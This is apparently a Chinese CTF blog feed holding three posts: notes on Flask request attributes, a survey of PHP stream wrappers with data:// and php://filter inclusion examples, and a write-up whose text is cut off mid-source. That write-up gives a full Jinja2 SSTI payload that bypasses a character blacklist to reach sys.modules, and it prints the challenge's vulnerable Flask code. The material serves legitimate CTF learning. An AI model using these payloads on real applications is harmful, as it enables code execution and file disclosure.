href="#accept-mimetypes" class="headerlink" title="accept_mimetypes"></a>accept_mimetypes</h2><p>此客户端支持作为MIMEAccept对象的mimetype列表。是处理http包中的<code>Accept</code>头的数据。</p><p><img src="image-20201231224846242.png" alt="image-20201231224846242"></p><p>accept_mimetypes接受的数据是用list类型来保存的.list中的元素是元组存在的.</p><p><img src="image-20201231225023882.png" alt="image-20201231225023882"></p><p>accept_mimetypes数据也是以空格或逗号(<code>,</code>)来进行分割的.</p><h2 id="access-route"><a href="#access-route" class="headerlink" title="access_route"></a>access_route</h2><p>如果存在转发的标头，则这是从客户端ip到最后一个代理服务器的所有ip地址的列表。</p><p><img src="image-20201231225515776.png" alt="image-20201231225515776"></p><p>可以被<code>X-Real-IP</code>覆盖掉。但用使用Client-IP或者X-Real-IP<strong>不能覆盖</strong>。以逗号(<code>,</code>)来进行分割的.</p><p><img src="image-20201231225842253.png" alt="image-20201231225842253"></p><h2 id="args"><a href="#args" class="headerlink" title="args"></a>args</h2><p>解析的URL参数。即获取以get方式提交的参数。</p><p><img src="image-20201231230539295.png" alt="image-20201231230539295"></p><h2 id="authorization"><a href="#authorization" class="headerlink" title="authorization"></a>authorization</h2><p>解析形式的Authorization对象。</p><p>是处理http包中的<code>Authorization</code>头的数据。不能随意伪造。</p><p><img src="image-20201231231151079.png" alt="image-20201231231151079"></p><h2 id="base-url"><a href="#base-url" class="headerlink" title="base_url"></a>base_url</h2><p>类似于url但不带查询字符串的内容</p><p><img src="image-20201231231742000.png" alt="image-20201231231742000"></p><h2 id="cache-control"><a href="#cache-control" class="headerlink" title="cache_control"></a>cache_control</h2><p>是处理http包中的<code>Cache-Control</code>头的数据。</p><p><img src="image-20210101104459225.png" alt="image-20210101104459225"></p><p>cache_control接受的数据是用<code>dict</code>类型来保存的.</p><p><img src="image-20210101104532078.png" alt="image-20210101104532078"></p><p>cache_control是以逗号(<code>,</code>)分割的。</p><p><img src="image-20210101104819616.png" alt="image-20210101104819616"></p><p><img src="image-20210101104911020.png" alt="image-20210101104911020"></p><h2 id="content-encoding"><a href="#content-encoding" class="headerlink" title="content_encoding"></a>content_encoding</h2><p>是处理http包中的<code>Content-Encoding</code>头的数据。</p><p><img src="image-20210101110051635.png" alt="image-20210101110051635"></p><p>content_encoding接受的数据是用<code>str</code>类型来保存的.</p><p><img src="image-20210101110301434.png" alt="image-20210101110301434"></p><p>content_encoding是以一个一个字符来分割的。</p><h2 id="content-length"><a href="#content-length" class="headerlink" title="content_length"></a>content_length</h2><p>是处理http包中的<code>Content-Length</code>头的数据。</p><p><img src="image-20210101110911675.png" alt="image-20210101110911675"></p><h2 id="content-md5"><a href="#content-md5" class="headerlink" title="content_md5"></a>content_md5</h2><p>是处理http包中的<code>Content-MD5</code>头的数据。</p><p><img src="image-20210101111258925.png" alt="image-20210101111258925"></p><p>content_md5接受的数据是用<code>str</code>类型来保存的.</p><h2 id="content-type"><a href="#content-type" class="headerlink" title="content_type"></a>content_type</h2><p>是处理http包中的<code>Content-Type</code>头的数据。Content-Type实体标头字段指示发送给接收者的实体主体的媒体类型，或者在HEAD方法的情况下，如果请求是GET，则应发送的媒体类型。</p><p><img src="image-20210101111621966.png" alt="image-20210101111621966"></p><p>content_type接受的数据是用<code>str</code>类型来保存的.</p><h2 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h2><p>对检索到的cookie值的只读访问权限为字典(<code>dict</code>)。是处理http包中的<code>Cookie</code>头的数据。</p><p><img src="image-20210101112042177.png" alt="image-20210101112042177"></p><h2 id="date"><a href="#date" class="headerlink" title="date"></a>date</h2><p>是处理http包中的<code>Date</code>头的数据。其语义与RFC 822中的“原始日期”相同,不能随意修改。</p><p><img src="image-20210101112205964.png" alt="image-20210101112205964"></p><h2 id="files"><a href="#files" class="headerlink" title="files"></a>files</h2><p>对http包中文件的处理。</p><h2 id="form"><a href="#form" class="headerlink" title="form"></a>form</h2><p>对http包中post参数的处理。</p><p><strong><img src="image-20210101114236684.png" alt="image-20210101114236684"></strong></p><p>在get请求下这个参数无效</p><h2 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h2><p>对http包中所有头参数的处理。</p><p><img src="image-20210101123732789.png" alt="image-20210101123732789"></p><h2 id="host"><a href="#host" class="headerlink" title="host"></a>host</h2><p>对http包中<code>HOST</code>头参数的处理。</p><p><img src="image-20210101123917231.png" alt="image-20210101123917231"></p><p>host接受的数据是用<code>str</code>类型来保存的.</p><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><p>如果mimetype为application / json，则它将包含已解析的JSON数据。</p><h2 id="mimetype"><a href="#mimetype" class="headerlink" title="mimetype"></a>mimetype</h2><p>类似于content_type，但没有参数（例如，没有字符集，类型等），并且总是小写.</p><p>是同时处理Content-Type头的属性.</p><p><img src="image-20210101134434520.png" alt="image-20210101134433492"></p><p>mimetype是以字符串来处理但我们在控制时,只能处理Content-Type头的数据.</p><h2 id="mimetype-params"><a href="#mimetype-params" class="headerlink" title="mimetype_params"></a>mimetype_params</h2><p>mimetype_params是以dict的来处理Content-Type的数据</p><p><img src="image-20210101134647203.png" alt="image-20210101134647203"></p><h2 id="path"><a href="#path" class="headerlink" title="path"></a>path</h2><p>得到请求的路径.由url / 后的数据控制.</p><p><img src="image-20210101134916747.png" alt="image-20210101134916747"></p><h2 id="remote-addr"><a href="#remote-addr" class="headerlink" title="remote_addr"></a>remote_addr</h2><p>客户端的远程地址。(无法伪造?)</p><p><img src="image-20210101135554993.png" alt="image-20210101135554993"></p><h2 id="url"><a href="#url" class="headerlink" title="url"></a>url</h2><p>重建的当前URL为IRI。</p><p><img src="image-20201231231756221.png" alt="image-20201231231756221"></p><h2 id="user-agent"><a href="#user-agent" class="headerlink" title="user_agent"></a>user_agent</h2><p>是处理http包中的<code>User-Agent</code>头的数据。</p><p><img src="image-20210101140036906.png" alt="image-20210101140036906"></p><p>user_agent是以元组的方式来处理数据的.</p><h2 id="values"><a href="#values" class="headerlink" title="values"></a>values</h2><p>同时处理get参数与post参数</p><p><img src="image-20210101140708664.png" alt="image-20210101140708664"></p><p>GET方式下只处理get参数.</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/jxl1996/p/10245958.html" target="_blank" rel="noopener">http头讲解</a></p><p><a href="https://tedboy.github.io/flask/generated/generated/flask.Request.html" target="_blank" rel="noopener">flask request讲解</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对php伪协议的归纳</title>
      <link href="/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/"/>
      <url>/2020/12/30/%E5%AF%B9php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%BD%92%E7%BA%B3/</url>
      
        <content type="html"><![CDATA[<p>PHP不仅自身带有很多内置 URL 风格的封装协议,还之前很多的支持的协议与封装协议.而PHP伪协议， 可以理解是PHP支持的协议与封装协议.我们在通过伪协议来方便地管理php服务器，也可以用伪协议来做些敏感操作。如之前提过的<a href="https://lexsd6.github.io/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86">文件包含</a>，除此外还有ssrf、xxe等。</p><p>PHP支持的协议有12种。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p><code>file://</code>(文件系统) 是 PHP 使用的默认封装协议，展现了本地文件系统。 当指定了一个相对路径（不以<code>/、\、\\</code>或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。 在很多情况下是脚本所在的目录，除非被修改了。 使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</p><p>在某些函数里，例如 fopen() 和 file_get_contents()， include_path 会可选地搜索，也作为相对的路径.</p><p>用法:</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span>:<span class="comment">//./index.php        #相对路径读取文件</span></span><br><span class="line"><span class="keyword">file</span>:<span class="comment">///var/www/html/index.php  #绝对路径读取</span></span><br><span class="line"><span class="keyword">file</span>:<span class="comment">//http://127.0.0.1/index.php   #网络路径读取</span></span><br></pre></td></tr></table></figure><h2 id="http-s"><a href="#http-s" class="headerlink" title="http(s)://"></a>http(s)://</h2><p>允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。 HTTP 请求会附带一个 Host: 头，用于兼容基于域名的虚拟主机。</p><p>该文件协议受<code>allow_url_fopen</code>选项限制，出于安全性考虑，此选项只能在 <code>php.ini</code> 中设置。</p><p>用法：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure><h2 id="ftp-s"><a href="#ftp-s" class="headerlink" title="ftp(s)://"></a>ftp(s)://</h2><p>允许通过 FTP 读取存在的文件，以及创建新文件。 如果服务器不支持被动（passive）模式的 FTP，连接会失败。和http一样，远程访问受 allow_url_fopen 影响。</p><p>打开文件后你既可以读也可以写，但是不能同时进行。 当远程文件已经存在于 ftp 服务器上，如果尝试打开并写入文件的时候， 未指定上下文（context）选项 overwrite，连接会失败。 如果要通过 FTP 覆盖存在的文件， 指定上下文（context）的 overwrite 选项来打开、写入。</p><p>用法：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ftp:<span class="comment">//example.com/pub/file.txt</span></span><br><span class="line">ftp:<span class="comment">//user:password@example.com/pub/file.txt</span></span><br><span class="line">ftps:<span class="comment">//example.com/pub/file.txt</span></span><br><span class="line">ftps:<span class="comment">//user:password@example.com/pub/file.txt</span></span><br></pre></td></tr></table></figure><h2 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h2><p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p><h3 id="php-stdin-php-stdout-和-php-stderr"><a href="#php-stdin-php-stdout-和-php-stderr" class="headerlink" title="php://stdin, php://stdout 和 php://stderr"></a>php://stdin, php://stdout 和 php://stderr</h3><p><code>php://stdin</code>、<code>php://stdout</code>和 <code>php://stderr</code> 允许直接访问 PHP 进程相应的输入或者输出流。 数据流引用了复制的文件描述符，所以如果你打开<code>php://stdin</code>并在之后关了它， 仅是关闭了复制品，真正被引用的 STDIN 并不受影响。 注意 PHP 在这方面的行为有很多 BUG 直到 PHP 5.2.1。 推荐你简单使用常量 STDIN、 STDOUT 和 STDERR 来代替手工打开这些封装器。</p><p><code>php://stdin 是</code>只读的， <code>php://stdout</code>和 <code>php://stderr</code> 是只写的。</p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code> 是个可以访问请求的原始数据的只读流.可以用于来接受post提交的数据。<code>enctype=&quot;multipart/form-data&quot;</code> 的时候 <code>php://input</code> 是无效的。受allow_url_include选项的影响.</p><p>用法：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//input</span></span><br><span class="line">post ： this <span class="keyword">is</span> data</span><br></pre></td></tr></table></figure><p><img src="image-20210211214100080.png" alt="image-20210211214100080"></p><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p><code>php://output</code>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p><h3 id="php-fd"><a href="#php-fd" class="headerlink" title="php://fd"></a>php://fd</h3><p><code>php://fd</code> 允许直接访问指定的文件描述符。 例如 php://fd/3 引用了文件描述符 3。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>php://filter与file://协议相似在双off的情况下也可以正常使用.</p><p>用法: php://filter/筛选过滤方式/resource=&lt;文件&gt;</p><p>例:php://filter/read=convert.base64-encode/resource=index.php</p><p>(ps:read可以省略,如:php://filter/convert.base64-encode/resource=index.php)</p><p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p><p><img src="image-20210211215702641.png" alt="image-20210211215702641"></p><p>而php中可以支持的过滤器一共有4类.</p><h4 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h4><h5 id="1-string-rot13"><a href="#1-string-rot13" class="headerlink" title="#1 string.rot13"></a>#1 string.rot13</h5><p>将字符串内容进行一次rot13加密.但由于rot13的特点也可以理解为对内容进行解密.</p><p>string.rot13（自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。</p><h5 id="2-string-toupper"><a href="#2-string-toupper" class="headerlink" title="#2 string.toupper"></a>#2 string.toupper</h5><p>将字符串内容中的所有字母转换成为大写字符。</p><p>string.toupper（自 PHP 5.0.0 起）使用此过滤器等同于用 strtoupper()函数处理所有的流数据。</p><h5 id="3-string-tolower"><a href="#3-string-tolower" class="headerlink" title="#3 string.tolower"></a>#3 string.tolower</h5><p>将字符串内容中的所有字母转换成为小写字符。</p><p>string.tolower（自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。</p><h5 id="4-string-strip-tags"><a href="#4-string-strip-tags" class="headerlink" title="#4 string.strip_tags"></a>#4 string.strip_tags</h5><p>用来过滤字符串内容中的<strong>标签</strong>。使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p>要注意的是string.strip_tags已自 PHP 7.3.0 起废弃。</p><h4 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h4><h5 id="1-convert-base64-encode"><a href="#1-convert-base64-encode" class="headerlink" title="#1 convert.base64-encode"></a>#1 convert.base64-encode</h5><p>将内容进行一次base64加密。</p><h5 id="2-convert-base64-decode"><a href="#2-convert-base64-decode" class="headerlink" title="#2 convert.base64-decode"></a>#2 convert.base64-decode</h5><p>将内容进行一次base64解密。</p><h5 id="3-convert-quoted-printable-encode"><a href="#3-convert-quoted-printable-encode" class="headerlink" title="#3 convert.quoted-printable-encode"></a>#3 convert.quoted-printable-encode</h5><p>将 8-bit 字符串转换为quoted-printable 字符串。</p><h5 id="4-convert-quoted-printable-decode"><a href="#4-convert-quoted-printable-decode" class="headerlink" title="#4  convert.quoted-printable-decode"></a>#4  convert.quoted-printable-decode</h5><p>将 quoted-printable 字符串转换为 8-bit 字符串。</p><h4 id="压缩过滤器"><a href="#压缩过滤器" class="headerlink" title="压缩过滤器"></a>压缩过滤器</h4><h5 id="1-zlib-deflate和-zlib-inflate"><a href="#1-zlib-deflate和-zlib-inflate" class="headerlink" title="#1 zlib.deflate和 zlib.inflate"></a>#1 zlib.deflate和 zlib.inflate</h5><p>zlib.deflate是用zlib进行文件流加密。</p><p>zlib.inflate是用zlib进行文件流解密。</p><h5 id="2-bzip2-compress和-bzip2-decompress"><a href="#2-bzip2-compress和-bzip2-decompress" class="headerlink" title="#2 bzip2.compress和 bzip2.decompress"></a>#2 bzip2.compress和 bzip2.decompress</h5><p>bzip2.compress和 bzip2.decompress工作的方式与上面讲的 zlib 过滤器相同。 </p><h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><p>mcrypt.<em>和 mdecrypt.</em>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为 mcrypt.ciphername，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可</p><p><img src="image-20210211224321101.png" alt="image-20210211224321101"></p><p>另外<code>php://filter</code>还可以通过<code>|</code>将过滤结合使用。</p><p><img src="image-20210211224559184.png" alt="image-20210211224559184"></p><h2 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://, bzip2://, zlib://"></a>zip://, bzip2://, zlib://</h2><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。不受allow_url_fopen和allow_url_include影响.</p><p>zip://  处理的是 ‘.zip’ 后缀的压缩包</p><p>compress.zlib:// 处理的是 ‘.gz’ 后缀的压缩包</p><p>compress.bzip2://  处理的是 ‘.bz2’ 后缀的压缩包</p><p>zip://用法: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip:&#x2F;&#x2F;archive.zip#dir&#x2F;file.txt</span><br><span class="line"></span><br><span class="line">即zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]**要用绝对路径+url编码#</span><br></pre></td></tr></table></figure><p>(zip只能用绝对路径)</p><p>bzip2://用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;&#x2F;etc&#x2F;www&#x2F;html&#x2F;file.bz2</span><br><span class="line">也可以相对路径</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;.&#x2F;file.bz2</span><br></pre></td></tr></table></figure><p>zlib://用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2:&#x2F;&#x2F;&#x2F;etc&#x2F;www&#x2F;html&#x2F;file.gz</span><br><span class="line">也可以相对路径</span><br><span class="line">compress.bzip2:&#x2F;&#x2F;.&#x2F;file.gz</span><br></pre></td></tr></table></figure><h2 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h2><p>又称为RFC 2397 协议,data://协议在‘allow_url_fopen =on ’与v‘allow_url_include：on’<br>且php 版本大于等于 php5.2 才能生效。</p><p>用法： data://资源类型;编码,内容 （‘data://’也可以写成‘data:’）</p><p>例如：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/test.php?a=data://text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span></span><br></pre></td></tr></table></figure><h2 id="glob"><a href="#glob" class="headerlink" title="glob://"></a>glob://</h2><p>查找匹配的文件路径模式。</p><p>用法：glob://[文件路径]/[文件名].[文件后缀]</p><p>例如：</p><p><code>glob://ext/spl/examples/*.php</code></p><p>搜索<code>ext/spl/examples/</code>下所有后缀为php的文件.</p><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>phar:// 数据流包装器自 PHP 5.3.0 起开始有效</p><p>用于处理phar文件时,会自动反序列化</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#gopher" target="_blank" rel="noopener">https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/#gopher</a></p><p><a href="https://blog.csdn.net/whackw/article/details/46448279" target="_blank" rel="noopener">https://blog.csdn.net/whackw/article/details/46448279</a></p><p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/wrappers.php</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HWCTF-华为云场WP</title>
      <link href="/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/"/>
      <url>/2020/12/21/HWCTF-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BAWP/</url>
      
        <content type="html"><![CDATA[<p>突然发现柴鸡的我除了ssti其他都不会,嘤嘤嘤( •̥́ ˍ •̀ू )</p><a id="more"></a><h2 id="mine1-1"><a href="#mine1-1" class="headerlink" title="mine1_1"></a>mine1_1</h2><p>题目一开,经过测试发现是一道python2 ssti,但发现过滤 单引号、双引号这导致我们不能直接构造字符串来传参数，并且ban了<code>_</code>让我们对<code>__class__</code>这些内置属性访问产生了烦恼，同时ban了<code>[</code>让我们对字典的操作受到影响。但好在符号和关键字没有ban全。</p><h3 id="字符串问题"><a href="#字符串问题" class="headerlink" title="字符串问题"></a>字符串问题</h3><p>1.我们可以利用request对象属性来传递参数。</p><p>虽然<code>args</code>、<code>host</code>、<code>headers</code>、<code>json</code>、<code>_</code>等字符被ban，但是还有cookies与values没有被ban。我们可以通过cookie传递或get参数。（ps：values在同时处理get与post的数据）</p><p>2.我们也可以利用dict 与join的特性来构筑字符串。例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict(args=<span class="number">1</span>)|join  <span class="comment">## "args"</span></span><br></pre></td></tr></table></figure><p>但这个不能绕出<code>_</code>，想要<code>_</code>要和上面面的1结合访问：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(request|attr(dict(args=<span class="number">1</span>)|join)).x  <span class="comment">## request.args.x</span></span><br></pre></td></tr></table></figure><p>然后get提交参数。</p><h3 id="内置属性访问"><a href="#内置属性访问" class="headerlink" title="内置属性访问"></a>内置属性访问</h3><p>由于ban了<code>_</code>、<code>&quot;</code>、<code>‘</code>、<code>[</code>但我们还是可以利用<code>|attr</code>+ 字符串的方式来访问。</p><h3 id="字典的操作"><a href="#字典的操作" class="headerlink" title="字典的操作"></a>字典的操作</h3><p>由于ban  <code>[</code> 因此要对字典进行取数据时要通过pop或<code>__getitem__</code>来取值。</p><p>但要注意的是pop 的作用是<u><strong>删除字典给定键 key 及对应的值，返回值为被删除的值</strong></u>所以慎重。</p><p>例如：<code>__globals__</code>后的字典pop <code>__builtins__</code>会因为无法删除而抱错。同时就会能访问取值，pop一次后该键值也可能被删除。</p><p>（做题时一开始用了pop卡了半天）</p><p>所以安全的访问还是用<code>__getitem__</code></p><p>对了，还有<code>|attr</code>与<code>__getattribute__</code>只处理属性，不会对字典取值。</p><p>所以payload，如下：（做题时，智障了忘了cookies与values绕了下）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((((((22|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x))|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x2))|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x3)()).pop(71)|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x4))|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x5))|attr((request|attr((dict(ar&#x3D;1,gs&#x3D;1)|join))).x7)(dict(sys&#x3D;1)|join)).modules&#125;&#125;&amp;x&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__init__&amp;x5&#x3D;__globals__&amp;x6&#x3D;pop&amp;x7&#x3D;__getitem__</span><br></pre></td></tr></table></figure><p><img src="image-20201222000742752.png" alt="image-20201222000742752"></p><p>然后是趴下的原码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,redirect</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_msg</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'args'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'_'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'['</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'path'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'host'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'headers'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'endpoint'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'json'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'user_agent'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">'"'</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"'"</span> <span class="keyword">in</span> msg <span class="keyword">or</span> <span class="string">"%"</span> <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/over", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'over.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/success", methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span 